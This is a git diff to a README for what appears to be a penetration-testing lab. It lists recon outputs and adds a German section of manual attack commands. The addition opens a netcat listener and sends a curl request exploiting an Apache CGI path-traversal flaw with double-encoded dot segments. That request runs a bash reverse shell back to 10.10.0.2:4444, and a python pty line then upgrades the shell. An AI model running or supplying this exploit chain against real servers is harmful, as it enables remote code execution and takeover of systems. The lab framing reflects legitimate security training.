@@ -58,3 +58,17 @@ Results land in `Attack-chain/results/` (bind-mounted, persisted on the host):
 | `gobuster.txt` | `gobuster dir` against `dirb/common.txt` (override via `--wordlist`) |
 | `ffuf.json` | extension fuzz on `/index<ext>` (JSON output from ffuf `-of json`) |
 | `nikto.txt` | `nikto -Tuning b` |
+
+
+## Commands for manuel Attack
+
+### Manuell RCE Shell öffnen mit:
+
+```
+rlwrap nc -lvnp 4444 # Listening auf Port 4444
+
+curl -s --path-as-is -H "Host: www.vulnerable.local" -d "echo Content-Type: text/plain; echo; /bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.0.2/4444 0>&1'" "http://router/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/b
+in/sh" # Apache exploit senden, sendet Reverse Shell an Kali:4444
+
+python3 -c 'import pty; pty.spawn("/bin/bash")' # Upgrade zu einer fähigeren Shell
+```
